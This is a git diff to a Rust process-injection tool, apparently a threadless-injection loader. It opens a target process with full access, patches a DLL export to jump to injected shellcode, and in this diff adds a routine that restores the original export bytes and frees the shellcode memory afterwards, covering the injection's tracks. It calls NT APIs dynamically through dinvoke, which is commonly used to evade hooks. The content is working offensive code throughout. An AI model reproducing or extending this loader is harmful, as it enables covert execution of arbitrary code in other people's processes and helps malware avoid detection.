@@ -12,6 +12,8 @@ use std::fs::File;
 
 use clap::Parser;
 
+use std::time::Instant;
+
 
 #[derive(Parser, Debug)]
 #[command(author, version, about, long_about = None)]
@@ -47,7 +49,6 @@ fn main() {
     0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3];
 
     let args = Args::parse();
-    let pid: u32 = args.pid;
 
     let mut shellcode: Vec<u8>;
     let shellcode_file = args.shellcode_file.unwrap_or(String::from(""));
@@ -79,8 +80,8 @@ fn main() {
 
     println!("[*] Found {}!{} at @{:x}", &args.dll, &args.export, export_address);
 
-    let target_process_handle = Threading::OpenProcess(Threading::PROCESS_ALL_ACCESS, false, pid).unwrap_or_else(|_|{
-        eprintln!("Could not get handle to pid {}", pid);
+    let target_process_handle = Threading::OpenProcess(Threading::PROCESS_ALL_ACCESS, false, args.pid).unwrap_or_else(|_|{
+        eprintln!("Could not get handle to pid {}", &args.pid);
         std::process::exit(1);
     });
 
@@ -93,8 +94,7 @@ fn main() {
     
     println!("[*] Allocated loader and shellcode at @{:x} in pid {}", loader_address, &args.pid);
 
-    let export_address: *const u64 = std::mem::transmute(export_address);
-    let original_bytes = std::ptr::read(export_address);
+    let original_bytes = read_virtual_memory(ntdll, export_address, target_process_handle);
 
     payload.splice(18..18+original_bytes.to_le_bytes().len(), original_bytes.to_le_bytes().iter().cloned());
     payload.append(&mut shellcode);
@@ -113,12 +113,17 @@ fn main() {
     println!("[*] Patched {}!{}", &args.dll, &args.export);
 
     // write payload at memory hole
-    write_payload(loader_address, payload, ntdll, target_process_handle).unwrap_or_else(|e|{
+    write_payload(loader_address, payload.clone(), ntdll, target_process_handle).unwrap_or_else(|e|{
         eprintln!("{}", e);
         std::process::exit(1);
     });
 
     println!("[*] Shellcode injected, waiting 60 seconds for hook to be called");
+
+    cleanup(export_address as usize, original_bytes, ntdll, target_process_handle, loader_address).unwrap_or_else(|e|{
+        eprintln!("{}", e);
+        std::process::exit(1);
+    });
 
    }
 }
@@ -229,13 +234,83 @@ unsafe fn write_payload(loader_address: i64, mut payload: Vec<u8>, ntdll: isize,
     Ok(())
 }
 
+unsafe fn cleanup(export_address: usize, original_byes: u64, ntdll: isize, target_process_handle: HANDLE, loader_address: i64) -> Result<(), &'static str>{
+
+    let mut ret: Option<i32>;
+    let mut bytes_to_read: usize = 8;
+    let mut bytes_read: usize = 0;
+    let mut buf: [u8; 8] = [0;8];
+
+    let mut export_address: *mut c_void =std::mem::transmute(export_address);
+
+    let mut func_ptr: unsafe extern "system" fn (HANDLE, *mut c_void, *mut c_void, usize, *mut usize) -> i32;
+
+    let mut executed = false;
+    let start = Instant::now();
+    while start.elapsed().as_secs() < 60 && executed != true {
+        dinvoke::dynamic_invoke!(ntdll, "NtReadVirtualMemory", func_ptr, ret, target_process_handle, export_address, buf.as_mut_ptr() as *mut c_void, bytes_to_read, &mut bytes_read);
+        if !(ret.unwrap() >= 0){
+            return Err("Error cleaning up export address");
+        }
+        let num = u64::from_le_bytes(buf);
+        if num == original_byes{
+            executed = true;
+        }
+        std::thread::sleep(std::time::Duration::from_secs(1));
+    }
+
+    if executed == true{
+        
+        let mut old_proect: u32 = 0;
+        let func_ptr: unsafe extern "system" fn (HANDLE, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;
+        dinvoke::dynamic_invoke!(ntdll, "NtProtectVirtualMemory", func_ptr, ret, target_process_handle, &mut export_address, &mut bytes_to_read, 0x20, &mut old_proect );
+        if !(ret.unwrap() >= 0){
+            return Err("Error cleaning up loader address");
+        }
+
+        let mut loader_address: *mut c_void = std::mem::transmute(loader_address);
+        let mut region_size: usize = 0;
+        let func_ptr: unsafe extern "system" fn (HANDLE, *mut *mut c_void, *mut usize, u32) -> i32;
+        dinvoke::dynamic_invoke!(ntdll, "NtFreeVirtualMemory", func_ptr, ret, target_process_handle, &mut loader_address, &mut region_size, 0x00008000);
+        if !(ret.unwrap() >= 0){
+            return Err("Error freeing up shellcode memoory");
+        }
+        println!("[*] Shellcode executed, export restored")
+    }else {
+        println!("[*] Shellcode did not execute within 60s, it may still execute but we are not cleaning up")
+    }
+    windows::Win32::Foundation::CloseHandle(target_process_handle);
+
+    Ok(())
+
+}
+
+unsafe fn read_virtual_memory(ntdll: isize, export_address: usize, target_process_handle: HANDLE) -> u64{
+
+    let ret: Option<i32>;
+    let bytes_to_read: usize = 8;
+    let mut bytes_read: usize = 0;
+    let mut buf: [u8; 8] = [0;8];
+
+    let export_address: *mut c_void =std::mem::transmute(export_address);
+
+    let func_ptr: unsafe extern "system" fn (HANDLE, *mut c_void, *mut c_void, usize, *mut usize) -> i32;
+    dinvoke::dynamic_invoke!(ntdll, "NtReadVirtualMemory", func_ptr, ret, target_process_handle, export_address, buf.as_mut_ptr() as *mut c_void, bytes_to_read, &mut bytes_read);
+    if !(ret.unwrap() >= 0){
+        println!("Error reading memory");
+    }
+
+    let num = u64::from_le_bytes(buf);
+    num
+}
+
 fn read_file(shellcode_file: &String) -> io::Result<Vec<u8>>{
     let f = File::open(Path::new(shellcode_file)).or_else(|e| Err(e))?;
 
     let mut reader = BufReader::new(f);
     let mut buffer = Vec::new();
     
-    // Read file into vector.
+    // Read file into vector
     reader.read_to_end(&mut buffer)?;
 
     Ok(buffer)
